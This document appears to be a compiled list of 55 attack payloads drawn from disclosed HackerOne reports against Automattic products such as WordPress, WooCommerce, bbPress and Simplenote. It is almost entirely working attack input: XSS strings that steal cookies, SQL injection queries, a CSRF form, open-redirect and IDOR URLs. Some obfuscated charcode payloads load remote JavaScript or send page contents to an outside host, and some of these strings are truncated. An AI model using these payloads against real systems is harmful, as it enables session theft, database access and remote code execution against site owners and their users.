# Automattic

55 payloads.

### `74791695`

```
https://target.com/swf/storage.swf?onload=alert(1)
```

**Parameter:** `onload`
— [https://target.com storage.swf XSS](https://hackerone.com/reports/9522) · Automattic · [smiegles](https://hackerone.com/smiegles)

### `60b18fe8`

```
<img src=x onerror=alert(1)>
```

— [http://target.com/ Self XSS](https://hackerone.com/reports/14303) · Automattic · [smiegles](https://hackerone.com/smiegles)

### `493e1fc3`

```
http://95.213.191.146/r.php?url=http%3A%2F%2Fevil.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

**Parameter:** `url`
— [XSS at target.com](https://hackerone.com/reports/111365) · Automattic · [valievkarim](https://hackerone.com/valievkarim)

### `0dcedc21`

```
https://target.com/themes/filter/blog/type/%22%3E%3Cimg%20src=a%20onerror=alert%28document.domain%29%3E
```

— [XSS at target.com](https://hackerone.com/reports/111500) · Automattic · [valievkarim](https://hackerone.com/valievkarim)

### `6c10f64e`

```
https://target.com/wp-login.php?redirect_to=https%3A%2F%2Fevil.com%2Fsearch?q=myFakeSite&reauth=1
```

**Parameter:** `redirect_to`
— [CPU utilization 99% on visiting wordpress site url & open redirect found](https://hackerone.com/reports/129091) · Automattic · [csanuragjain](https://hackerone.com/csanuragjain)

### `5ca35cc8`

```
https://target.com/website/?currency=%3C/title%3E%3C/script/%22-alert%280%29-%22--%3E%22%3E%3Csvg/onload=prompt%28document.domain%29%3E
```

**Parameter:** `currency`
— [XSS on target.com](https://hackerone.com/reports/133963) · Automattic · [spam404](https://hackerone.com/spam404)

### `e98f5695`

```
<member><name>file</name><value>ccc'&gt;test&lt;img src=x onerror=alert('xss') onload=alert('xss')&gt;</value></member>
```

— [WordPress core stored XSS via attachment file name](https://hackerone.com/reports/139245) · Automattic · [jouko](https://hackerone.com/jouko)

### `4ab98ee5`

```
user1"onmouseover="alert(1);remove()"style="position:absolute;left:0;top:0;margin-top:-100%;margin-left:-100%;width:5000px;height:5000px"
```

**Parameter:** `bbp_user`
— [\[bbPress\] Stored XSS in any forum post.](https://hackerone.com/reports/151117) · Automattic · [psych0tr1a](https://hackerone.com/psych0tr1a)

### `5f480991`

```
https://target.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://evil.com/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
https://evil2.com/tr/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
```

— [Follow Button XSS](https://hackerone.com/reports/172574) · Automattic · [bobrov](https://hackerone.com/bobrov)

### `ca97bbce`

```
<script type='text/javascript'>
/* <![CDATA[ */
var actionbardata = {
...
"subscribeNonce":"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"9dca8606d3\" \/><input type=\"hidden\" name=\"_wp_http_referer\" 
value=\"\/support\/\"><script>alert(document.domain)<\/script>\" \/>",
"referer":"https:\/\/target.com\/support\/\"><script>alert(document.domain)<\/script>",
"canFollow":"1"
...
</script>
```

**Parameter:** `referer`
— [Follow Button XSS](https://hackerone.com/reports/172574) · Automattic · [bobrov](https://hackerone.com/bobrov)

### `c52f86cb`

```
<div id="137"><svg>
<a xmlns:xlink="http://target.com/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(document.domain)" to="&" />
</a>//["'`-->]]>]</div>
```

— [\[target.com\] Stored XSS via Markdown SVG filter bypass](https://hackerone.com/reports/271007) · Automattic · [ysx](https://hackerone.com/ysx)

### `63dfd8b1`

```
eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100
```

**Parameter:** `note_body`
— [\[Simplenote for Windows\] Client RCE via External JavaScript Inclusion leveraging Electron](https://hackerone.com/reports/291539) · Automattic · [ysx](https://hackerone.com/ysx)

### `563e20f0`

```
## Test Note
### HackerOne Windows RCE PoC - pops "netplwiz"

<img src=x onerror=eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99
```

**Parameter:** `note_body`
— [\[Simplenote for Windows\] Client RCE via External JavaScript Inclusion leveraging Electron](https://hackerone.com/reports/291539) · Automattic · [ysx](https://hackerone.com/ysx)

### `40de25e9`

```
'"><div id="test"><head><base href="javascript://"/></head><body><a href="/. /, /' onmouseover=confirm(document.domain); abc=abc">TESTLINK
```

**Parameter:** `blog`
— [\[target.com\] Stored XSS via Crafted Developer App Description](https://hackerone.com/reports/293743) · Automattic · [ysx](https://hackerone.com/ysx)

### `91b8cb44`

```
<form action="javasc
ript:alert(document.domain)"><button>Click</button></form>
```

**Parameter:** `lesson[goals]`
— [Stored XSS in target.com via the lesson\[goals\] parameter.](https://hackerone.com/reports/300270) · Automattic · [edoverflow](https://hackerone.com/edoverflow)

### `e02deb6a`

```
<form action="javasc
ript:eval(String.fromCharCode(118,97,114,32,109,97,114,107,117,112,61,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,105,110,110,101,114,72,84,77,76,59,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,115,122,54,113,104,97,115,122,63,116,101,120,116,61,34,43,101,110,99,111,100,101,85,82,73,40,109,97,114,107,117,112,41,46,1
```

**Parameter:** `lesson[goals]`
— [Stored XSS in target.com via the lesson\[goals\] parameter.](https://hackerone.com/reports/300270) · Automattic · [edoverflow](https://hackerone.com/edoverflow)

### `9fc178a0`

```
> "><img src=/ onerror="alert(location.host)"
```

— [DOM based XSS in the WooCommerce plugin](https://hackerone.com/reports/507139) · Automattic · [wild0ni0n](https://hackerone.com/wild0ni0n)

### `cda124b8`

```
'"><img src=x onerror=alert(1) x=y
```

**Parameter:** `County`
— [WooCommerce: Persistent XSS via customer address (state/county)](https://hackerone.com/reports/530499) · Automattic · [foobar7](https://hackerone.com/foobar7)

### `e605dab4`

```
[code]javascript://%0dalert%28document.cookie%29[/code]
```

— [Stored XSS vulnerability in comments on *.target.com](https://hackerone.com/reports/707720) · Automattic · [poutine_hero](https://hackerone.com/poutine_hero)

### `110247fa`

```
<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
```

— [Stored XSS in target.com](https://hackerone.com/reports/733248) · Automattic · [adhamsadaqah](https://hackerone.com/adhamsadaqah)

### `3fd9fdfe`

```
https://target.com/widgets/share/tool?url=https%3A%2F%2Fevil2.com%2F&title=%3Ca%20href=%22javascript:alert(document.domain);//http://evil.com/%22%3Eclick%20me%3C/a%3E&selection=click%20in%20the%20link%20after%20reblog&shareSource=chrome_extension
```

— [DOM-Based XSS in target.com](https://hackerone.com/reports/882546) · Automattic · [keer0k](https://hackerone.com/keer0k)

### `b0c60379`

```
javascript:alert(document.domain);//https://evil.com/
```

— [DOM-Based XSS in target.com](https://hackerone.com/reports/882546) · Automattic · [keer0k](https://hackerone.com/keer0k)

### `b0529466`

```
https://target.com/users/invite-user.php?id=(userid)&popup=1
```

**Parameter:** `id`
— [IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal](https://hackerone.com/reports/915114) · Automattic · [bugra](https://hackerone.com/bugra)

### `bfda7f37`

```
https://target.com/users/invite-user.php?id=19920465&popup=1
```

**Parameter:** `id`
— [IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal](https://hackerone.com/reports/915114) · Automattic · [bugra](https://hackerone.com/bugra)

### `2206ff5e`

```
[wpvideo%20w0MiG12Exx1\"><svg/onload=prompt(document.domain)>]
```

**Parameter:** `media[23168664]`
— [Stored XSS on target.com + evil.com via Embed Media](https://hackerone.com/reports/920005) · Automattic · [ali](https://hackerone.com/ali)

### `ba4d87f6`

```
<script>alert(document.domain)</script>
```

— [Reflected XSS on a Atavist theme](https://hackerone.com/reports/947790) · Automattic · [bugra](https://hackerone.com/bugra)

### `b97cb359`

```
https://target.com/search?search=%3Cscript%3Ealert(document.domain
```

**Parameter:** `search`
— [Reflected XSS on a Atavist theme](https://hackerone.com/reports/947790) · Automattic · [bugra](https://hackerone.com/bugra)

### `ffb879bf`

```
https://target.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

**Parameter:** `search`
— [Reflected XSS on a Atavist theme](https://hackerone.com/reports/947790) · Automattic · [bugra](https://hackerone.com/bugra)

### `9e30a7f6`

```
http://target.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

**Parameter:** `search`
— [Reflected XSS on a Atavist theme](https://hackerone.com/reports/947790) · Automattic · [bugra](https://hackerone.com/bugra)

### `b07f5634`

```
line 1309 : n.html('"<u>' + t + '</u>"')                                                                   https://www.<img src=x onerror='alert()'>
```

**Parameter:** `t`
— [\[target.com\] Exploiting clickjacking vulnerability to trigger self DOM-based XSS](https://hackerone.com/reports/953579) · Automattic · [fuzzme](https://hackerone.com/fuzzme)

### `e1cf34d4`

```
[dailymotion id=x8oma9"><svg/onload=prompt(document.domain)>]
```

**Parameter:** `media[11111111]`
— [Stored XSS on https://target.com/surveys/\[Survey-Id\]/question - Bypass](https://hackerone.com/reports/974271) · Automattic · [ali](https://hackerone.com/ali)

### `926658ce`

```
<script src='$Value'>
```

**Parameter:** `scripts`
— [Reflected XSS on a Atavist theme at external_import.php](https://hackerone.com/reports/976657) · Automattic · [bugra](https://hackerone.com/bugra)

### `1a1d717b`

```
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="https://target.com/svc/user/filtered_content" method="POST">

      <input type="hidden" name="filtered&#95;content" value="pwd777" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>
```

— [\[target.com\] CSRF in /svc/user/filtered_content](https://hackerone.com/reports/1010806) · Automattic · [fuzzme](https://hackerone.com/fuzzme)

### `90092d27`

```
"><img src=x onerror=alert(document.cookie);>
```

— [XSS in Email Input \[target.com\]](https://hackerone.com/reports/1037714) · Automattic · [ahmd_halabi](https://hackerone.com/ahmd_halabi)

### `f9e33d36`

```
Parameter: search (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: limit=10&offset=20&organization_id=88822&search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg&sort=
```

**Parameter:** `search`
— [Sql injection on target.com](https://hackerone.com/reports/1039315) · Automattic · [lu3ky-13](https://hackerone.com/lu3ky-13)

### `dd2708eb`

```
<img src="https://target.com/images/a-addblog.png" onload="alert()">
```

— [Stored XSS in Intense Debate comment system](https://hackerone.com/reports/1039750) · Automattic · [hundredpercent](https://hackerone.com/hundredpercent)

### `12a10cb4`

```
</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=prompt(document.cookie)//>\x3e
```

**Parameter:** `txtCode`
— [\[target.com\] XSS Reflected POST-Based on update/tumblr2/{$id}](https://hackerone.com/reports/1040639) · Automattic · [fuzzme](https://hackerone.com/fuzzme)

### `bbe83408`

```
https://target.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23
```

— [SQL Injection Union Based](https://hackerone.com/reports/1046084) · Automattic · [fuzzme](https://hackerone.com/fuzzme)

### `bfd5ea37`

```
javascript:alert(document.cookie)
```

— [\[target.com\] - XSS when adjust block Poll - Confirmation Message -  On submission:Redirect to another webpage - Redirect address:\[xss_payload\]](https://hackerone.com/reports/1050733) · Automattic · [superman85](https://hackerone.com/superman85)

### `f217901c`

```
6. Change the Style Name with <noscript><p title= "</noscript><img src=x onerror=alert(document.cookie)>">, check the checkbox next to Save Style, click Save Style.
```

— [Stored XSS in target.com](https://hackerone.com/reports/1054526) · Automattic · [ucuping](https://hackerone.com/ucuping)

### `e36b9443`

```
http://127.0.0.1:9090
```

— [GET /api/v2/url_info endpoint is vulnerable to Blind SSRF](https://hackerone.com/reports/1057531) · Automattic · [atc_h1h1](https://hackerone.com/atc_h1h1)

### `b020ac28`

```
);>.html                                                                        http://██████████.target.com/"><img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)

### `5b7f550f`

```
"><img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)

### `a93be798`

```
http://██████.target.com/"><img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)

### `eec7bfe8`

```
http://█████.target.com/&quot;&gt;&lt;img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)

### `ad9b336c`

```
http://████████.target.com/&amp;quot;&amp;gt;&amp;lt;img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)

### `e77253b6`

```
https://target.com/sock/1/0/0/0/htmlfile?c=alert(
```

**Parameter:** `c`
— [Reflected XSS due to vulnerable version of sockjs](https://hackerone.com/reports/1100326) · Automattic · [chip_sec](https://hackerone.com/chip_sec)

### `aced2316`

```
https://target.com/?s=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28document.cookie%29%3E&post_type=knowledgebase
```

**Parameter:** `s`
— [XSS and HTML Injection on the target.com search box](https://hackerone.com/reports/1537149) · Automattic · [sawrav-chowdhury](https://hackerone.com/sawrav-chowdhury)

### `09035fd0`

```
XSS Payload: "><img src=x onerror=javascript:alert(document.cookie)>
```

— [XSS and HTML Injection on the target.com search box](https://hackerone.com/reports/1537149) · Automattic · [sawrav-chowdhury](https://hackerone.com/sawrav-chowdhury)

### `626b6b03`

```
XSS Payload:  "><img src=x onerror=javascript:alert(document.cookie)>
```

— [ Site information's Display Name section vulnerable for XSS attacks and HTML Injections.](https://hackerone.com/reports/1554888) · Automattic · [sawrav-chowdhury](https://hackerone.com/sawrav-chowdhury)

### `0e3136ee`

```
<a href='javascript:alert(document.domain);'>Click Me</a>
```

— [Stored XSS on target.com  evil.com via Thank You Header](https://hackerone.com/reports/1842822) · Automattic · [0xwega74](https://hackerone.com/0xwega74)

### `024a632e`

```
2 . Put the payload as answer <img src=x onerror=alert(document.cookie)>
```

— [Stored XSS on  target.com](https://hackerone.com/reports/1987172) · Automattic · [riadalrashed](https://hackerone.com/riadalrashed)

### `159163d1`

```
https://target.com/start/account/user?variationName=free&redirect_to=javascript:alert(document.domain
```

**Parameter:** `redirect_to`
— [reflected xss in https://target.com/start/account/user](https://hackerone.com/reports/2055132) · Automattic · [secureighty](https://hackerone.com/secureighty)

### `9bf13a8b`

```
GET /wp-admin/admin.php?page=wc-reports&tab=orders&report=coupon_usage&coupon_codes=')+union+select+1,sleep(10)--+- HTTP/1.1
Host: <host>
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en
```

**Parameter:** `coupon_codes`
— [Woocommerce SQL Injection in WC_Report_Coupon_Usage](https://hackerone.com/reports/3198980) · Automattic · [q5ca](https://hackerone.com/q5ca)

### `fc2f60ff`

```
a:1:{s:34:"<script>alert('test')</script>test";a:1:{s:7:"expires";i:1893456000;}}
```

— [XSS Vulnerability on Pressable/Atomic Hosting Platform via unescaped admin notices leads to code execution](https://hackerone.com/reports/3447021) · Automattic · [georgestephanis](https://hackerone.com/georgestephanis)
